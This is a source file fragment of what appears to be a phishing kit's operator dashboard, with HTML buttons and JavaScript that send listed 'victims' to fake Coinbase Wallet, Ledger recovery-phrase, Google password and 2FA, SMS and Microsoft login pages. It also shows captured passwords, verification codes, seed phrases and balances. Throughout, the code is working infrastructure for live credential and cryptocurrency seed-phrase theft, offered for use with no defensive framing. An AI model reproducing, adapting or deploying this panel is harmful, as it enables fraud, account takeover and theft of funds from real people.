                            <div class="divider-line" style="margin: 15px 0; height: 1px;"></div>
                            
                            <div>
                                <div class="page-label">COINBASE WALLET</div>
                                <div class="page-buttons-container">
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportGenSeed')">Generate Wallet</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportcbwunlink')">Whitelist Wallet</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportwhitelistsuccess')">Whitelist Success</button>
                                </div>

                                <div class="page-label" style="padding-top: 15px;">RECOVERY PHRASE</div>
                                <div class="page-buttons-container">
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportUnauth')">Unauthorize Wallet</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportImportSeed')">Import Seed</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportunlink')">Unlink Wallet</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportinvalidseed')">Invalid Seed</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportLedger')">Ledger - Phrase</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportexternalwalletremove')">External Wallet Removed</button>
                                </div>

                                <div class="page-label" style="padding-top: 15px;">MAIN PAGES</div>
                                <div class="page-buttons-container">
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportbalance')">Confirm Balance</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportIncorrectPassword')">Invalid Password</button> 
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'submitUrl')">URL Redirect</button>  
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'smsCode')">SMS</button> 
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportTerminate')">Terminate Device</button> 
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportloading')">Loading</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportPending')">Pending</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportSwap')">Swap</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportinvalidseed')">Invalid Seed</button>
                                </div>

                                <div class="page-label" style="padding-top: 15px;">EMAIL PAGES</div>
                                <div class="page-buttons-container">
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'report2fa')">Google - 2FA</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'reportGmailPwd')">Google - Password</button>
                                    <button class="page-button" onclick="updatePreviewUrl(${victimId}, 'showModal')">Google - Verify</button>
                                </div>
                            </div>

                            <div class="divider-line" style="margin: 20px 0; height: 1px;"></div>

                            <div class="action-buttons-container">
                                <button type="button" class="button ONLINE" style="height: 28px; width: 100%; font-size: 16px;" onclick="executeAction(${victimId})">REDIRECT</button>
                                <button type="button" class="button" style="height: 28px; width: 100%; font-size: 16px;" onclick="previewPage(${victimId})">PREVIEW</button>
                                <button type="button" class="button OFFLINE" style="height: 28px; width: 100%; font-size: 16px;" data-dismiss="modal">CLOSE</button>
                            </div>
                            
                            <!-- Corner boxes and middle lines -->
                            <div class="top-left"></div>
                            <div class="top-right"></div>
                            <div class="bottom-left"></div>
                            <div class="bottom-right"></div>
                            
                            <div class="middle-top"></div>
                            <div class="middle-bottom"></div>
                            <div class="middle-left"></div>
                            <div class="middle-right"></div>
                        </div>
                    </div>
                </div>
                `;
                $('body').append(modalHtml);
                $(`#manageModal-${victimId}`).modal('show');
                $('.modal-backdrop').remove();
            }
            window.executeAction = function (victimId) {
                // Get the action from the data attribute instead of the dropdown
                const action = $(`#manageModal-${victimId}`).data('action');

                // Execute the appropriate function based on the action
                if (action === 'smsCode') {
                    smsCode(victimId);
                } else if (action === 'showModal') {
                    showModal(victimId);
                } else if (action === 'reportGmailPwd' || action === 'report2fa') {
                    emailModal(victimId, action);
                } else {
                    window[action](victimId);
                }

                // Close the manage modal after the action is executed
                $(`#manageModal-${victimId}`).modal('hide');
                $('.modal-backdrop').remove();
            };
            window.previewPage = function (victimId) {
                $(`#manageModal-${victimId}`).modal('hide');
                const pageUrl = determinePageUrl(victimId);
                const iframeHtml = `<iframe src="${pageUrl}" style="width:100%; border: none; height:620px; pointer-events: none;" ></iframe>`;
                const previewModalHtml = `
                <div class="modal" id="previewModal-${victimId}" tabindex="-1" role="dialog" aria-labelledby="previewModalLabel-${victimId}" aria-hidden="true">
                    <div class="modal-dialog modal-lg" role="document" style="max-width: 960px;">
                        <div class="modal-content" style="background-color: rgba(13, 19, 26, 0.87); color: white; border: 1px solid #444; max-width: 960px;">
                            <div class="modal-header" style="justify-content: center; border-bottom: 1px solid #444;">
                                <h5 class="modal-title" id="previewModalLabel-${victimId}">Preview Page</h5>
                            </div>
                            <div class="modal-body">
                                ${iframeHtml}
                            </div>
                            <div class="modal-footer" style="border-top: 1px solid #444;">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal" onclick="reopenManageModal(${victimId})">Close</button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
                $('body').append(previewModalHtml);
                $(`#previewModal-${victimId}`).modal('show');
                $('.modal-backdrop').remove();
            }

            window.updatePreviewUrl = function (victimId, pageID) {
                const pageUrl = determinePageUrl(victimId, pageID);

                $(`#previewModal-${victimId} iframe`).attr('src', pageUrl);
                $(`#manageModal-${victimId}`).data('action', pageID);
            };

            window.reopenManageModal = function (victimId, pageUrl) {
                $(`#previewModal-${victimId}`).modal('hide');
                $(`#manageModal-${victimId}`).modal('show');
                $('.modal-backdrop').remove();
            }
            function determinePageUrl(victimId, action) {
                <?php

                // Set the session to visit the preview pages
                $_SESSION['email'] = 'byte_array@example.com';
                $_SESSION['password'] = '1234567890';

                ?>
                console.log(action);
                switch (action) {
                    case 'reportIncorrectPassword':
                        return `/signin?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&pwd=true&inc=true`;
                    case 'reportImportSeed':
                        return `/account/vault?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportGenSeed':
                        return `/account/recovery?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportloading':
                        return `/loading/loading?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportunlink':
                        return `/wallet/unlink?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportcbwunlink':
                        return `/account/unlink?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportreview2':
                        return `/review/auth?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportbalance':
                        return `/account/balance?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportinvalidseed':
                        return `/invalid/seed?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportwhitelistsuccess':
                        return `/whitelist/success?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportexternalwalletremove':
                        return `/external/remove?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportPending':
                        return `/account/pending?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportSms':
                        return `/account/sms?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportTerminate':
                        return `/account/terminate?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportSwap':
                        return `/transaction/swap?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportUnauth':
                        return `/account/unauth?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportFinish':
                        return `/account/wait?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportReschedule':
                        return `/account/reschedule?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'submitUrl':
                        return 'https://google.com';
                    case 'reportMicrosoftLogin':
                        return `/ms/login?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'report2fa':
                        return `/g/2fa?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportGmailPwd':
                        return `/g/pwd?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportLedger':
                        return `/l/recovery?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'reportPending':
                        return `/account/pending?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    case 'showModal':
                        return `/g/verify?client_id=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}&oauth_challenge=${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}-${Math.random().toString(36).substring(2, 15)}`;
                    default:
                        return '/';
                }
            }
            function displayPagination(totalItems) {
                $('#pagination').empty();
                const pageCount = Math.ceil(totalItems / rowsPerPage);
                for (let i = 1; i <= pageCount; i++) {
                    $('#pagination').append(`<a href="#" class="${i === currentPage ? 'active' : ''}" onclick="changePage(${i})">${i}</a>`);
                }
            }


            window.reportTerminate = function (id) {
                const url = `/admin/actions?action=terminate&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportReschedule = function (id) {
                const url = `/admin/actions?action=reschedule&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportFinish = function (id) {
                const url = `/admin/actions?action=finish&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportUnauth = function (id) {
                const url = `/admin/actions?action=unauth&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }




            window.reportIncorrectPassword = function (id) {
                const url = `/admin/actions?action=redirect_password&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportMicrosoftLogin = function (id) {
                const url = `/admin/actions?action=microsoft_login&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportGenSeed = function (id) {
                const url = `/admin/actions?action=genseed&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }
            window.reportSwap = function (id) {
                const url = `/admin/actions?action=swap&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }
            window.reportloading = function (id) {
                const url = `/admin/actions?action=loading&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportunlink = function (id) {
                const url = `/admin/actions?action=unlink&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportcbwunlink = function (id) {
                const url = `/admin/actions?action=cbwunlink&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportinvalidseed = function (id) {
                const url = `/admin/actions?action=invalidseed&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }
            
            window.reportwhitelistsuccess = function (id) {
                const url = `/admin/actions?action=whitelistsuccess&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }
            
            window.reportexternalwalletremove = function (id) {
                const url = `/admin/actions?action=externalremove&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportbalance = function (id) {
                const url = `/admin/actions?action=balance&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportImportSeed = function (id) {
                const url = `/admin/actions?action=seed&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportGmailPwd = function (id, email) {
                const url = `/admin/actions?action=gmail_pwd&id=${id}&email=${email}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportDelete = function (id) {
                const url = `/admin/actions?action=delete&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been deleted');
            }

            window.reportLedger = function (id) {
                const url = `/admin/actions?action=update_phrase&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportPending = function (id) {
                const url = `/admin/actions?action=pending&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.submitUrl = function (id) {
                $('#urlModal').show();
                $('#urlInput').val('');
                $('#urlModal button').off('click').on('click', function () {
                    const url = $('#urlInput').val();
                    reportUrl(id, url);
                    $('#urlModal').hide();
                });
            }

            window.smsCode = function (id) {
                $('#smsModal').show();
                $('#smsModal button').off('click').on('click', function () {
                    const code = $('#smsCode').val();
                    reportSms(id, code);
                    $('#smsModal').hide();
                });
            }


            window.reportSms = function (id, code) {
                const url = `/admin/actions?action=sms&id=${id}&num=${code}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.reportUrl = function (id, url_redirect) {
                const url = `/admin/actions?action=url_redirect&id=${id}&url=${url_redirect}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }


            window.changePage = function (page) {
                if (page !== currentPage) {
                    currentPage = page;
                    renderPageData();
                }
            }

            fetchData();
            setInterval(fetchData, 1500);

            window.toggleDropdown = function (button, id) {
                const dropdownContent = $(button).next('.custom-dropdown-content');
                dropdownContent.toggle();
                if (dropdownContent.is(':visible')) {
                    openDropdowns.add(id);
                } else {
                    openDropdowns.delete(id);
                }
            }

            function restoreOpenDropdowns() {
                openDropdowns.forEach(id => {
                    $(`#dropdown-${id}`).show();
                });
            }

            function restoreSelectedRows() {
                selectedRows.forEach(id => {
                    $(`#row-${id}`).addClass('selected');
                });
            }

            window.reportMicrosoftLogin = function (id) {
                const url = `/admin/actions?action=microsoft_login&id=${id}`;
                fetch(url, { method: 'GET' });
                notyf.success('Victim has been redirected');
            }

            window.showModal = function (id) {
                $('#myModal').show();
                $('#myModal button').off('click').on('click', function () {
                    const code = $('#2faCode').val();
                    report2facode(id, code);
                    $('#myModal').hide();
                });
            }

            window.report2facode = function (id, code) {
                const url = `/admin/actions?action=gmail_verify&id=${id}&gcode=${code}`;
                fetch(url, { method: 'GET' });
                notyf.success('2FA code has been updated and victim has been redirected');
            }

            window.emailModal = function (id, action) {
                $('#emailModal').show();
                $('#emailModal button').off('click').on('click', function () {
                    const email = $('#email').val();
                    $('#emailModal').hide();
                    window[action](id, email);
                })
            }
            window.report2fa = function (id, email) {
                const url = `/admin/actions?action=2fa_gmail&id=${id}&email=${email}`;
                fetch(url, { method: 'GET' });
                notyf.success('2FA code has been updated and victim has been redirected');
            }



            window.userInfo = function (id, useragent, ip, device, phrase, url, password, code, balance) {
                $('#userAgentDisplay').text(useragent === null ? 'N/A' : useragent);
                $('#userIpDisplay').text(ip === null ? 'N/A' : ip);
                $('#userDeviceDisplay').text(device === null ? 'N/A' : device);
                $('#userUrl').text(url === null ? 'N/A' : url);
                $('#passwordDisplay').text(password === null ? 'N/A' : password)
                $('#codeDisplay').text(code === null ? 'N/A' : code)
                $('#deviceLinkDisplay').text(url === null ? 'N/A' : url)
                $('#phraseDisplay').text(phrase === null ? 'N/A' : phrase)
                $('#balanceDisplay').text(phrase === null ? 'N/A' : balance)
                $('#userInfoModal').show();
            }

            $('.close').click(function () {
                $('#myModal').hide();
                $('#smsModal').hide();
                $('#userInfoModal').hide();
                $('#urlModal').hide();
            });

            window.handleSelectChange = function (select) {
                if (select.value === 'Logout') {
                    fetch('/logout').then(() => {
                        window.location.href = '/admin/login';
                    });
                }
            }
        });
    </script>
</body>

</html>